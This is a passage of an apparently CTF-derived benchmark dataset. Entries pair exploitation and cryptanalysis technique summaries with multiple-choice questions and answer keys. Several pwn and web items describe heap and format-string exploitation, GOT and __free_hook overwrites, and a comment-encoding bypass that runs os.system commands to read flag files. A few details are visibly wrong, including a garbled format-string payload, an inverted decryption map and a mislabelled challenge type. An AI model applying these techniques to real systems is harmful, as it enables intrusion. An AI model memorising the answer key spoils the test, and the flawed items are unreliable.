            "When restructuring a list into sublists to match a specific output utilizing recursion in Python, as illustrated by converting list A to B to apply `cdr(car(cdr(car(car(cdr(cdr(car(car(cdr(cdr(car(B))))))))))))` and obtain `('pugnacious', 'wallaby', 'savant', 'zarf')`, which practice is essential for setting up the nested list structure? - A. Placing all elements at the same nesting level and avoiding the use of sublists. - B. Randomly grouping elements into sublists without considering the recursive access pattern. - C. Intentionally creating a nested list structure where each subgroup is defined based on the order of recursion required to access specific elements. - D. Using a flat list structure without any sublists, relying purely on index manipulation to access elements."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "The Cobol Job",
        "write_up": "dataset/raw/The Cobol Job.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2021",
            "https://ctftime.org/event/1199/tasks/"
        ],
        "score": 130,
        "max_score": 450,
        "difficulty": 0.28888888888888886,
        "knowledge": [
            "To leak segment mappings in environments where direct file access is restricted and might trigger permissions issues (like `O_RDWR` errors), use the technique of copying the desired file (e.g., `/proc/self/maps`) to a permissible stdout location such as `/dev/stdout`. This method bypasses the permissions check and allows for information disclosure of memory layout or libc addresses without direct file reading capabilities. Example usage:\n```python\ndo_copy(\"/proc/self/maps\", \"/dev/stdout\")\n```",
            "In scenarios where a use-after-free vulnerability exists within a file handling or similar function (demonstrated in the `CBL_COPY_FILE()` function within `libcob`), manipulate the tcache bins to overwrite `__free_hook` with a one_gadget address. This method involves creating conditions that trigger a use-after-free, followed by carefully crafted allocations and deallocations to control tcache bins. The process includes steps such as:\n    - Triggering a use-after-free vulnerability to get a pointer into a tcache bin.\n    - Controlling the size of the tcache bin via operations like creating a file with a specific length.\n    - Writing to a freed memory location to redirect its forward and back pointers to `__free_hook`.\n    - Performing further allocations to manipulate tcache such that future allocations return a pointer to `__free_hook`.\n    - Writing a one_gadget address to the location pointed by `__free_hook` and triggering a freeing action to execute arbitrary code. Example conceptual approach (not direct code due to complexity and case specificity):\n```c\n// Conceptual steps in C-like pseudo-code\ncreate_file(\"controlled_size_filename\");\nwrite_file(\"address_of___free_hook\");\ntrigger_use_after_free();\nallocate(\"size_that_targets_correct_tcache_bin\");\nwrite_one_gadget_to_free_hook();\ntrigger_free_to_execute_one_gadget();\n```"
        ],
        "question": [
            "In a restricted file access environment where direct reading from `/proc/self/maps` results in permission errors due to `O_RDWR` flags, which method enables leaking of segment mappings by circumventing the permissions check?  - A. Use `do_copy(\"/proc/self/maps\", \"/tmp/maps\")` to copy the mappings to a temporary file and then read it. - B. Use `do_copy(\"/proc/self/maps\", \"/dev/stdout\")` to directly copy the mappings to stdout, avoiding permission issues. - C. Use `read(\"/proc/self/maps\")` and handle the `O_RDWR` error in exception handling mechanisms. - D. Execute a shell command `cat /proc/self/maps` and capture the output. ",
            "In the context of exploiting a use-after-free vulnerability to manipulate the tcache bins and overwrite the `__free_hook` with a one_gadget address, which of the following steps correctly outlines the process to achieve this goal?  - A. Perform a buffer overflow on a stack variable to redirect the return address to `__free_hook`. - B. Use a format string vulnerability to overwrite the `__free_hook` directly without interacting with tcache bins. - C. Leak a heap address and use it to perform an out-of-bounds write to the `__free_hook`. - D. Trigger a use-after-free, control the size of the tcache bin, write to the freed memory to direct pointers to `__free_hook`, manipulate tcache for future allocations to return a pointer to `__free_hook`, write a one_gadget to `__free_hook`, and trigger a free to execute arbitrary code. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "The Early School",
        "write_up": "dataset/raw/The Early School.md",
        "type": "crypto",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 32,
        "max_score": 500,
        "difficulty": 0.064,
        "knowledge": [
            "When an encryption algorithm encrypts data by splitting the input into chunks and applying mathematical operations bit by bit, a feasible approach to decrypting without understanding the precise math is to brute force each chunk's possible outcomes. This is particularly applicable when the size of the chunks makes the number of possible outcomes manageable, such as when operating on binary data 2 bits at a time. The distinct output strings for each input chunk combination can be reverse-mapped through a case selection strategy in the decryption process, assuming the output space for each input is finite and known.\n   \n   Example approach: For an encryption function that processes input in 2-bit chunks, create a decryption map such as `{\"00\": \"000\", \"01\": \"001\", \"10\": \"010\", \"11\": \"011\"}` where the keys are the encrypted 3-bit outputs and the values are the original 2-bit inputs. Then, iterate over the encrypted data in 3-bit chunks, replacing each chunk with its corresponding 2-bit original chunk using the map.",
            "When a CTF challenge provides an encryption script used in the encryption process, thoroughly analyze the script to understand the encryption mechanism. This can include the chunk size of the data being processed, the mathematical operations applied, or any patterns in how data is manipulated. Insight gained from the script can guide the development of a decryption strategy, even if the exact mathematical reversal is not straightforward. Developing familiarity with how encryption scripts operate can also accelerate the problem-solving process in future challenges.\n\n   Example approach: If the encryption script reads binary data in 2-bit chunks and outputs 3-bit chunks after applying certain operations, focus on understanding these operations and their implications for possible outputs. This understanding can then be used to brute force the decryption by testing all possible mappings from the 3-bit encrypted output back to the original 2-bit inputs."
        ],
        "question": [
            "In a CTF challenge scenario where encrypted data results from an encryption process that operates on binary data in 2-bit chunks and generates encrypted 3-bit output chunks, which strategy allows for effective decryption without direct reverse engineering of the encryption math? - A. Using statistical analysis on the frequency of each 3-bit chunk to identify the original 2-bit chunks. - B. Developing a map of possible 3-bit output strings to their corresponding 2-bit input chunks and iteratively decrypting the encrypted message. - C. Encrypting known plaintext repeatedly to generate a large dataset for machine learning classification. - D. Applying quantum computing principles to instantaneously solve for the original binary sequence.",
            "Upon encountering a script in a CTF challenge that encrypts a flag by converting it to binary and processing it in 2-bit chunks through a mathematical function, what is the most direct approach to start developing a decryption strategy? - A. Attempt to rewrite the encryption function in a more efficient programming language to speed up brute force attacks. - B. Directly apply common decryption tools with default settings to the encrypted data, hoping for an automatic solution. - C. Carefully analyze the script to understand the chunk size, the nature of the mathematical operations, and the output pattern for each input chunk to guide a brute force decryption. - D. Seek to collaborate with mathematicians to develop a new theory of cryptography that could invert the encryption process."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "The Emojificator",
        "write_up": "dataset/raw/The Emojificator.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 498,
        "max_score": 2199,
        "difficulty": 0.22646657571623466,
        "knowledge": [
            "When faced with an unconventional input method in a CTF challenge, specifically one using emojis as bytes, a comprehensive mapping between the desired byte values and available emojis can be established. This mapping should encode the full range of byte values (0-255) using a combination of emojis and operations (addition and subtraction) to represent each byte uniquely. Example implementation involves using a base set of emojis representing certain byte values and then systematically creating new representations for missing byte values by adding or subtracting known emojis.",
            "In scenarios requiring the execution of shellcode where direct binary input is not possible, before sending the actual payload, a verification step using part of the payload can ensure that the conversion from the emoji representation back to byte values on the server-side matches the intended values. This step is critical to confirm payload integrity and functionality before full execution. Utilize functions to encode shellcode into emojis according to the emoji-byte mapping, check conversions with a test request if necessary, then send the complete emoji shellcode to trigger the intended behavior, such as reading a file."
        ],
        "question": [
            "In the context of a CTF challenge where input is limited to emoji-based encoding for executing commands on a server, which of the following best describes the initial step in crafting a payload?  - A. Encode the entire payload using a single, predefined emoji to represent binary data. - B. Manually convert each byte of the payload into binary code and then find a corresponding emoji. - C. Establish a base set of emojis representing specific byte values and create representations for other bytes through addition and subtraction of these base values. - D. Randomly assign emojis to byte values without a systematic mapping or use of operations. ",
            "When ensuring the correct execution of shellcode encoded as emojis, due to restrictions on direct binary input in a cybersecurity challenge, what critical step should be taken before sending the complete payload?  - A. Immediately send the entire emoji-encoded shellcode without verifying the conversion process. - B. Use a hash function to confirm the integrity of the encoded payload before and after conversion. - C. Deploy a test request with a part of the payload to validate that the server-side conversion from emojis back to byte values matches the intended output. - D. Encrypt the emoji payload to enhance security and prevent tampering during the verification process. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "The Jungle",
        "write_up": "dataset/raw/The Jungle.md",
        "type": "web",
        "competition": [
            "watevrCTF/2019",
            "https://ctftime.org/event/893/tasks/"
        ],
        "score": 356,
        "max_score": 500,
        "difficulty": 0.712,
        "knowledge": [
            "When encountering a web application with an unusually large number of redirects that lead to an error (e.g., \"too many redirects\" error), consider writing a script that systematically visits all possible paths or steps sequentially instead of relying on the browser's handling of redirects. This approach allows for a more controlled investigation of the web application's behavior and can help bypass limitations set by browsers, such as Chrome's redirect limit.",
            "For challenges hinting at a timing difference in the web server's response, utilize timing attacks to uncover hidden paths or actions. Specifically, if different paths or actions cause the server to respond in noticeably different times, these differences can be exploited to discover the correct sequence of actions needed to achieve the goal. For instance, by measuring the response time for each request and comparing it against a baseline, one can identify the correct sequence of steps in a web application that relies on side-channel information (timing differences) for navigation. This requires careful measurement of response times for each action and may involve resetting session data (cookies) to ensure each test starts from the same state."
        ],
        "question": [
            "In a web application challenge, participants encounter a problem where attempting to navigate to a particular endpoint results in \"too many redirects\" error. This error is likely due to the browser reaching its limit for handling redirects. What could be an effective approach to investigate further and potentially bypass this browser limitation? - A. Increase the browser's cache size to handle more redirects. - B. Manually visit each redirect link by typing it into the browser. - C. Write a script to systematically visit all possible paths or steps sequentially. - D. Disable JavaScript in the browser to prevent redirects from occurring.",
            "When analyzing a web challenge, you notice that after clearing your session cookie and making a request to a specific path, the response time from the server varies significantly depending on the path requested. Some requests return almost instantly, while others take significantly longer (e.g., over 500ms). You suspect the challenge involves a timing side-channel attack, where the correct path causes a longer response time. Which strategy would best help in identifying the correct sequence of paths to achieve the intended outcome? - A. Repeatedly refresh the browser to force the server to cache and speed up the response time. - B. Conduct a timing attack by systematically measuring and comparing the response times for each path request after resetting the session cookie, identifying paths that result in longer response times. - C. Exclusively focus on optimizing the network connection to reduce all response times, eliminating any noticeable differences. - D. Submit multiple simultaneous requests to overload the server and potentially bypass the timing mechanism."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "The List",
        "write_up": "dataset/raw/The List.md",
        "type": "The type of challenge in this write-up is ***pwn*** (Binary Exploitation, Buffer Overflow).",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": 452,
        "max_score": 500,
        "difficulty": 0.904,
        "knowledge": [
            "In binary exploitation challenges featuring buffer overflow vulnerabilities, filling up a buffer without hitting a condition that stops you from adding more data - such as a null byte check - can pave the way to overflow. Specifically, if an application checks for a null byte at the beginning of a buffer to decide if more data can be added, you can exploit this by ensuring your payload doesn't start with a null byte and then using a different part of the application that allows for larger input to overflow the buffer. This strategy can be especially effective if there are two different functions for adding or editing data that allow for different sizes of input.",
            "In scenarios where specific functions like `strcspn` are used to manipulate strings \u2013 for instance, replacing newline characters (`\\n`) with null bytes \u2013 and there is an inconsistency in input size limits between different functions (such as adding a user vs. changing a user's name allowing 32 bytes vs. 80 bytes), the larger input function can be exploited to overflow the buffer. This requires carefully planning the initial payload to avoid premature null bytes introduced by input handling functions and then crafting an overflow payload that exploits the input size discrepancy to overwrite memory addresses, potentially allowing arbitrary code execution or, in CTF challenges, redirecting execution to a function that reveals the flag.\n\nExample payload concept (not specific code due to payload specifics depending on the binary's memory layout):",
            "Add users up to the point where the next user would overwrite a critical pointer.",
            "Use an initial payload that fills up the space exactly, avoiding an early null byte but ending with a payload that `strcspn` modifies to introduce a null byte exactly where needed.",
            "Use the function allowing more input to craft a payload that overflows the buffer and overwrites the return address or a function pointer with the address of the `give_flag` function or equivalent."
        ],
        "question": [
            "In a buffer overflow vulnerability scenario, when an application implements a check for a null byte at the beginning of a buffer to determine if additional data can be appended, how should an attacker format their initial payload to bypass this check and maintain the ability to append more data?  - A. Start the payload with a null byte to indicate the beginning of data. - B. Use a payload that fills the buffer completely without introducing any null byte until the very end. - C. Ensure the payload starts with multiple null bytes to bypass the check. - D. Fill the payload with non-null characters and ensure it ends with a null byte introduced by an application logic such as replacing a newline character. ",
            "When exploiting a buffer overflow vulnerability involving the `strcspn` function, which is used to replace newline characters with null bytes, and there is an inconsistency in the limit of input sizes between different functionalities (e.g., adding vs. changing a user's name with 32 bytes vs. 80 bytes limits), what critical step should be taken to leverage the larger input for exploitation?  - A. Avoid using the `strcspn` function entirely and focus on exploiting the smaller input function. - B. Craft the initial payload to fill up the space exactly without an early null byte but end it in a way that `strcspn` introduces a null byte where needed. - C. Always use the maximum allowed bytes in the first input to ensure the buffer is pre-filled with null bytes. - D. Insert null bytes at strategic points in the initial payload to ensure the application\u2019s logic adds more null bytes, increasing buffer size artificially. "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "THE LYCH KING",
        "write_up": "dataset/raw/THE LYCH KING.md",
        "type": "reverse",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When dealing with binary files compiled from high-level languages like Haskell, using language-specific decompilers can greatly enhance reverse-engineering efforts. This is especially useful for analyzing binaries compiled by GHC (Glasgow Haskell Compiler), where tools like hsdecomp help in decompiling to get an initial understanding of the binary's functionality.",
            "In cryptographic challenges where an XOR operation is used, and the algorithm involves generating a keystream based on certain inputs (like reversing digits and adding), reimplementing the encryption or decryption logic in a familiar programming language can be an effective strategy. This allows for easy manipulation of variables, such as changing seeds or adjusting algorithms, to decrypt the ciphertext or encrypt plaintext as needed. A practical approach involves writing a script to automate the encryption/decryption process with varying parameters until the correct output is identified.\n   \n   Example manipulation code snippet:\n   ```python\n   def xor_b_str(byte_array, key_string):\n       xored = []  \n       for i in range(min(len(byte_array), len(key_string))):  \n           xored_value = byte_array[i % len(byte_array)] ^ ord(key_string[i % len(key_string)])  \n           xored.append(chr(xored_value))  \n       return ''.join(xored)\n\n   def getPad(seed):  \n       result = \"\"  \n       while not isPalindrome(seed) and len(result) < 1000:  \n           result += str(seed)  \n           seed += reverseDigits(seed)  \n       return result\n\n   # Example of XORing the data with the pad generated from a seed\n   pad = getPad(seed)\n   decrypted_output = xor_b_str(cipher_text_bytes, pad)\n   ```\n   The approach leverages Python for string manipulation, bitwise operations, and handling of byte arrays, showcasing a method to solve cryptographic problems efficiently in CTF challenges."
        ],
        "question": [
            "When reverse-engineering a binary file compiled from Haskell using GHC, what type of tool is beneficial for initial analysis and understanding of the binary's functionality? - A. A general-purpose binary decompiler - B. A Haskell-specific decompiler like hsdecomp - C. A simple text editor for manual code inspection - D. An online Haskell compiler for recompilation",
            "In the context of decrypting a ciphertext where the encryption scheme involves an XOR operation with a dynamically generated keystream based on reversing digits and adding, what programming approach can be effectively used to automate the decryption process? - A. Recompiling the original Haskell binary with different parameters - B. Writing a Haskell script that mimics the original encryption logic - C. Using Python to replicate the encryption/decryption logic with the ability to easily change seeds and parameters - D. Manually performing XOR operations with potential keystream segments to find matches"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "The Most Worthy Distinction of Pain",
        "write_up": "dataset/raw/The Most Worthy Distinction of Pain.md",
        "type": "misc",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": 465,
        "max_score": 500,
        "difficulty": 0.93,
        "knowledge": [
            "When facing an encryption challenge where each word in the ciphertext corresponds to a pair of letters in the plaintext, utilize a known plaintext attack (KPA) strategy by generating all possible two-letter combinations, encrypting them, and mapping the output to the pairs. This approach allows for the construction of a decryption key by identifying the correspondence between encrypted words and plaintext pairs.",
            "To efficiently decrypt ciphertext once a key is constructed, store the key-value pairs in a dictionary where each key is an encrypted word and its value is the corresponding plaintext letters. Iterating through the ciphertext and looking up each word in the dictionary provides a quick decryption process. This method significantly reduces computational effort compared to brute force decryption, especially when the encryption mechanism is deterministic and each plaintext pair always results in the same encrypted word irrespective of its position in the plaintext.\n\nExample Python dictionary setup for storing the decryption key:\n```python\nkey = {\n    'encryptedWord1': 'ab',\n    'encryptedWord2': 'cd',\n    # Add more key-value pairs based on encryption output\n}\n```\n\nExample usage for decryption:\n```python\ndecryptedText = ''.join(key[word] for word in encryptedText.split())\n```"
        ],
        "question": [
            "In the context of decoding an encrypted message where each word in the ciphertext corresponds to two letters in the plaintext, using a deterministic encryption algorithm, what method should be employed to generate the decryption key? - A. Manually guess the plaintext corresponding to each ciphertext word. - B. Employ a brute force attack with random letter combinations until the correct plaintext is found. - C. Generate and encrypt all possible two-letter combinations, mapping the output to the pairs to construct a decryption key. - D. Use frequency analysis to guess the most common plaintext pairs. ",
            "After constructing a decryption key by mapping encrypted words to their corresponding plaintext letters, what is the most efficient approach to decrypt the ciphertext in a deterministic encryption scheme where each ciphertext word always corresponds to the same plaintext letters regardless of their position? - A. Iterate through each word in the ciphertext, using a nested loop to compare each word to every key in the decryption dictionary. - B. Split the ciphertext into individual words and use a hardcoded switch-case statement for each possible encrypted word to map to plaintext. - C. Use a dictionary with encrypted words as keys and their corresponding plaintext letters as values, then iterate through the ciphertext, replacing each word with its plaintext equivalent based on the dictionary. - D. Decrypt each word in the ciphertext individually through an online decryption service, then manually compile the decrypted output into the original plaintext. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "The note",
        "write_up": "dataset/raw/The note.md",
        "type": "misc",
        "competition": [
            "SecurityFest/2018",
            "https://ctftime.org/event/622/tasks/"
        ],
        "score": 485,
        "max_score": 499,
        "difficulty": 0.9719438877755511,
        "knowledge": [
            "In challenges involving historical or thematic ciphers, contextual clues or themes from the challenge description can be critical in identifying the cipher used. If a challenge mentions or hints at historical, literary, or thematic elements (e.g., mentioning a book with nihilism as a central theme), it can be invaluable to explore ciphers or cryptographic methods associated with those themes or periods. For instance, a challenge hinting at nihilism led to the discovery that a Nihilist cipher was used, a classical encryption method.",
            "When dealing with ciphertext encoded via a polybius square and an added layer of security, such as an additive key, breaking down the cipher involves several systematic steps before deciphering the plaintext:\n   - Analyze the frequency of each number in the ciphertext to identify potential patterns or anomalies.\n   - Recognize and eliminate the additive key using possible key lengths and validating against the polybius square coordinates to ensure all resultant numbers are within valid bounds (`1 \u2264 row \u2264 5`, `1 \u2264 column \u2264 5`).\n   - Utilize frequency analysis and known cribs (e.g., common trigrams like \"THE\" in English) to reconstruct the polybius square and sequentially decode the plaintext. This approach leans on the fact that certain letters or combinations thereof appear with more regularity in a given language.\n   \nExample process for subtracting a potential key from a column in the ciphertext (simplified for clarity):\nFor a column `i` and a potential key value `k[i]`:\n```\nCiphered values (column): 42 37 45 \nPotential key (k[i]): 12\nSubtracted values: 30 25 33\n```\nIf the subtracted values correspond to valid polybius square coordinates, `k[i]` may be a correct part of the additive key."
        ],
        "question": [
            "In a cryptography challenge, if the narrative mentions or alludes to a specific historical, literary, or thematic element such as nihilism and its associated texts, which of the following actions is most beneficial for identifying the cipher used? - A. Searching for cryptographic methods unrelated to the themes or periods mentioned. - B. Exploring ciphers historically or thematically associated with the mentioned elements, such as the Nihilist cipher for themes of nihilism. - C. Ignoring the thematic clues and focusing exclusively on modern cryptographic techniques. - D. Assuming all classic ciphers are equally likely without considering the thematic clues. ",
            "When attempting to decipher ciphertext encoded with a polybius square and an additional layer of security through an additive key, which step is necessary to begin decoding the plaintext? - A. Arbitrarily changing the numeric values without any systematic approach. - B. Immediately guessing the plaintext without analyzing the ciphertext's numeric patterns. - C. Analyzing the frequency of each number in the ciphertext and systematically eliminating the additive key by checking if subtracted values fall within valid polybius square coordinates (`1 \u2264 row \u2264 5`, `1 \u2264 column \u2264 5`). - D. Assuming all numbers in the ciphertext directly translate to plaintext letters without considering the use of an additive key. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "The oracle",
        "write_up": "dataset/raw/The oracle.md",
        "type": "crypto",
        "competition": [
            "Hero/2022",
            "https://ctftime.org/event/1663/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When decrypting text encrypted with a substitution cipher, identifying and replacing the most frequently occurring characters with common symbols or letters (e.g., space, 'e') can provide initial clues towards deciphering. This method hinges on the assumption that certain characters or symbols appear more commonly in the given language of the encrypted text. Start by replacing the most common character with a space ('0x20') if dealing with hex-encoded binary or textual data, as spaces are often the most common in English plaintext.",
            "For complex substitution ciphers where direct cribs (expected words or sequences) do not work due to the cipher's composition or the text not containing anticipated common words, employing frequency analysis and interactive decoding tools can effectively deduce the cipher. This involves mapping out character frequencies within the encrypted message and methodically substituting them based on their frequency of occurrence compared to known frequency distributions in the target language. Tools or scripts that allow for the interactive replacement and immediate feedback on the decryption progress can significantly speed up this process, especially in formats where there are numerous distinct values or characters beyond standard alphabetic substitution."
        ],
        "question": [
            "In the context of solving substitution ciphers, if you encounter a hex-encoded cipher text where the most frequent hex value is `0x68`, which common English plaintext character should this likely be replaced with first to aid in decryption? - A. Replace it with 'A' - B. Replace it with '0x20' (which represents a space character in ASCII) - C. Replace it with 'E' - D. Replace it with '1'",
            "When direct word guesses (like 'the') fail in decrypting a substitution cipher due to unconventional text or cipher structure, what strategy should be employed next for effective decryption? - A. Random guessing of character substitutions - B. Using a thesaurus to find alternative words - C. Employing frequency analysis and interactive decoding tools for character substitution based on known linguistic frequency distributions - D. Translating the ciphertext into another language before decoding"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "The Pwn Inn",
        "write_up": "dataset/raw/The Pwn Inn.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 477,
        "max_score": 1000,
        "difficulty": 0.477,
        "knowledge": [
            "When encountering a format string vulnerability in a 64-bit dynamically linked executable that is not stripped, and has Partial RELRO and NO PIE protections, one can use the vulnerability to write arbitrary data to specific memory locations. This can be exploited by overwriting the Global Offset Table (GOT) entries of critical functions like `exit()` to redirect code execution flow to functions beneficial for an attacker, such as a vulnerability function that may allow repeated exploitation or a shell spawning function.",
            "To leverage a format string vulnerability for leaking memory addresses and defeating Address Space Layout Randomization (ASLR), one can read out the GOT entries of functions like `puts` to leak libc addresses. With the libc address leaked, it's possible to calculate the address of system-critical functions like `system` by finding their offsets online. Once the address of `system` is known, GOT entries of a function that processes user-controlled input, such as `printf`, can be overwritten to redirect executions to `system`, allowing execution of arbitrary commands.\n   \nExample payload to redirect `printf`'s GOT entry to `system`: `%<offset_to_vuln_function>$n%<offset_to_puts_got_entry>$s`"
        ],
        "question": [
            "In a scenario involving a format string vulnerability in a 64-bit dynamically linked executable which has Partial RELRO and NO PIE protections, how is it possible to perpetuate the exploit and maintain control over the execution flow?  - A. By modifying the stack pointer to point to attacker-controlled data - B. By overwriting the GOT entry of the `exit()` function to point to a vulnerability function, thus allowing repetitive exploitation - C. By creating a loop within the binary that continuously executes a piece of malicious code - D. By encrypting the GOT entries to prevent their modification by security mechanisms ",
            "In the context of exploiting a format string vulnerability to bypass Address Space Layout Randomization (ASLR), what is the correct step to perform after leaking a libc address through GOT entries like that of `puts`?  - A. Calculate the distance between the stack pointer and the base address of libc - B. Overwrite the GOT entry of `exit()` with the leaked libc address - C. Use the leaked libc address to find the offset to critical functions like `system` online and prepare to overwrite a suitable GOT entry - D. Immediately spawn a shell using the leaked libc address without further actions "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "The Show Must Go On",
        "write_up": "dataset/raw/The Show Must Go On.md",
        "type": "pwn",
        "competition": [
            "UMDCTF/2022",
            "https://ctftime.org/event/1593/tasks/"
        ],
        "score": 808,
        "max_score": 987,
        "difficulty": 0.8186423505572442,
        "knowledge": [
            "When facing a Buffer OverFlow (BOF) challenge involving dynamic memory allocation on the heap, if there's an `fgets` call that reads a user-controllable amount more data than the allocated buffer size, this discrepancy can be leveraged to overwrite nearby heap memory or structures. This is particularly exploitable when the memory layout is predictable, for example, if the allocations and frees are performed in a certain order that makes a critical structure (like a function pointer) a neighbor of the overflowable buffer. The strategy is to calculate the payload size needed to reach the target structure from the buffer. It is necessary to consider the size of the buffer, any metadata (like the heap's metadata structures), and the offset to the target structure.\n\nExample Payload Calculation:\n```python\nbuffer_size = user_controlled_size # Size up to which data can be read by fgets\nheap_structure_size = 16 # Hypothetical size of heap's metadata structure between buffers\noffset_to_target = 0x60 # Offset from the start of the overflow buffer to the target structure\npayload_size = buffer_size + heap_structure_size + offset_to_target\npayload = (payload_size * b\"A\") + p64(address_of_target_function)\n```",
            "In scenarios involving exploiting heap-based vulnerabilities to achieve Remote Code Execution (RCE), if the binary has a function that can lead to winning conditions (e.g., printing a flag), but there's no direct call to this function in the normal program flow, modifying a function pointer on the heap to point to this 'win' function can achieve the desired outcome. This technique is particularly useful in challenges where the memory layout or certain patterns of allocation and deallocation can lead the exploit developer to control the content of a function pointer. A critical step here is to ensure the payload properly aligns the 'win' function's address with the corrupted function pointer's memory location. If the binary is not compiled with Position Independent Executable (PIE), absolute addresses can be used directly in the payload.\n\nExample Payload to Overwrite Function Pointer:\n```python\nwin_function_address = p64(binary.sym.win) # Use p64 for 64-bit binaries\n# Constructing the payload. Note: 'A'*240 represents the calculated number of bytes to reach the function pointer.\npayload = b'A' * 240 + win_function_address\n```"
        ],
        "question": [
            "In a Buffer OverFlow (BOF) exploitation scenario involving a heap corruption due to an incorrect buffer size in `fgets`, which of the following is necessary to calculate the size of a payload designed to overwrite a specific target structure like a function pointer located after the buffer? - A. Just the buffer size allocated by malloc_set(). - B. The sum of the buffer size, any heap metadata size, and the offset to the target structure. - C. The length of the data the user inputs, ignoring the heap metadata and target structure offset. - D. Only the size of the heap's metadata structure, excluding the buffer size and target structure offset.",
            "If a binary with no Position Independent Executable (PIE) contains a 'win' function that is not called in the normal program flow, and there is an opportunity to overwrite a function pointer on the heap due to a vulnerability, which approach is effective for crafting a payload to achieve Remote Code Execution (RCE)? - A. Overwriting the function pointer with random values until the program crashes, revealing the win function's address. - B. Using a brute-force attack to guess the address of the 'win' function and replace the function pointer with it. - C. Directly placing the absolute address of the 'win' function into the payload at the calculated offset to overwrite the function pointer. - D. Only sending the name of the 'win' function in the hope that the binary dynamically resolves it during execution."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "the-substitution-game",
        "write_up": "dataset/raw/the-substitution-game.md",
        "type": "misc",
        "competition": [
            "redpwn/2021",
            "https://ctftime.org/event/1327/tasks/"
        ],
        "score": 145,
        "max_score": 481,
        "difficulty": 0.30145530145530147,
        "knowledge": [
            "When dealing with string manipulations in CTF challenges, especially where transformations are based on applied rules one after another, leveraging Python's `str.replace()` method can effectively automate the process of changing initial strings to target strings. This method applies all instances of the replacement at once, an important factor to consider when planning transformations to reach a desired output. Crafting the sequence of replacement rules carefully can solve complex transformation challenges.\n\nExample payload for string shortening:\n```\naa => a\naaa => a\n```",
            "In scenarios involving pattern recognition or calculation simulations with strings (such as detecting palindromes or performing binary addition), constructing an incremental replacement strategy that simulates the logical steps or checks of the operation can lead to solutions for seemingly complex problems. This involves breaking down the problem into smaller, manageable operations that can be represented as string replacements. For palindromes, manipulating markers towards the center, and for binary addition, sequentially aligning and adding least significant digits can systematically solve the problems.\n\nExample payload for shifting markers towards the center in a palindrome check:\n```\n^0 => 0^z\n0$ => z$0\n^1 => 1^z\n1$ => z$1\nz => \n```"
        ],
        "question": [
            "Given a scenario in a Capture the Flag competition where you need to convert an initially provided string to a target string using Python's str.replace() method, which of the following sets of rules would correctly represent the transformation from 'aaaaQQaa' to 'aQQa'?  - A. `aa => a` followed by `a => QQ` - B. `aaaa => aa` followed by `QQ => QQaa` - C. `aa => a` followed by `QQaa => QQ` - D. `a => aa` followed by `QQ => a` ",
            "In the context of a Capture the Flag challenge involving string manipulation to simulate checking for palindromes, which sequence of replacement rules demonstrates an incremental strategy for moving markers (^ and $) towards the center of the string?  - A. `^0 => ^0z` followed by `z$ => $0` - B. `^1 => 1^` followed by `$1 => 1$` - C. `^0 => 0^z` followed by `0$ => z$0` - D. `^ => z^` followed by `$ => $z` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "TheHiddenOne",
        "write_up": "dataset/raw/TheHiddenOne.md",
        "type": "web",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 249,
        "max_score": 500,
        "difficulty": 0.498,
        "knowledge": [
            "In challenges where code execution is constrained by specific patterns or regex validations, look for known features or workarounds within the language being used that could be exploited to bypass these restrictions. Specifically, for Python, you can use the `# coding: raw_unicode_escape` directive to encode arbitrary Python code in Unicode escape sequences. This encodes a newline as `\\u000a`, allowing for the execution of Python code hidden within comments that pass regex validations targeting comment lines. Example payload: \n   ```python\n   # coding: raw_unicode_escape  \n   #\\u000aimport os  \n   #\\u000aos.system(\"ls -laF\")  \n   #\\u000aos.system(\"cat *flag*\")\n   ```",
            "In challenges involving file uploads and subsequent code execution, if the scenario suggests inspecting behavior of utilities like `cat`, investigate less known features of these utilities as they might hint at bypass techniques. For instance, the `-v` option in `cat` showcases handling of unprintable characters, hinting that solutions might involve ASCII control codes to evade regex validations or alter file interpretation. Though specific payloads exploiting `cat -v` were not directly mentioned, the knowledge implies scrutinizing and utilizing command-line utility options (such as `-v` for `cat`) could provide alternate exploitation paths when facing validation or execution constraints."
        ],
        "question": [
            "In a Python-based CTF challenge, you are tasked to bypass a given regex filter by only allowing comments to be executed. However, you discover a technique that leverages Python's special comment directive for encoding to execute hidden code. Using `# coding: raw_unicode_escape` at the start of your file allows you to embed executable code in what appears to be a comment line due to encoding. Given this scenario, which of the following line of codes demonstrates how to properly execute the `os.system()` command to list directory content, assuming you're adhering to the mentioned technique?  - A. `#\\u000aos.system(\"dir\")` - B. `# coding: utf-8\\u000aos.system(\"ls -laF\")` - C. `#\\000aos.system(\"ls -laF\")` - D. `# coding: raw_unicode_escape  os.system(\"ls -laF\")` ",
